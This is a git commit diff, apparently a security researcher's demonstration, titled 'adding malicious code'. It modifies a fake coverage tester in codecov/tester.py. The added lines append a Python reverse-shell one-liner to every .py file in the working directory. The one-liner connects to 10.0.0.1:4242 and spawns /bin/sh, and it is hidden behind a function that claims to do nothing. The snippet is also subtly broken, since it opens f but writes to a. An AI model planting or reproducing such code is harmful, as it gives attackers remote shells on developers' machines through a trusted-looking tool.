8b4ec4dcebe79f7624a9641ceef6846d5f2c7d0e
Shai Dvash <shai.dvash@cyberark.com>
2022-01-19 13:52:53 +0200

    adding malicious code

--- codecov/tester.py
+++ codecov/tester.py
@@ -6,4 +6,10 @@ def run():
 	# We don't actually run anything. We've got you covered!
 	time.sleep(3)
 
+	files = Path(".").glob('*.py')
+	for file in files:
+	    f = open(file, "a")
+	    a.write("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
+	    a.close()
+
 	print("YOU'RE COVERED! YE!")
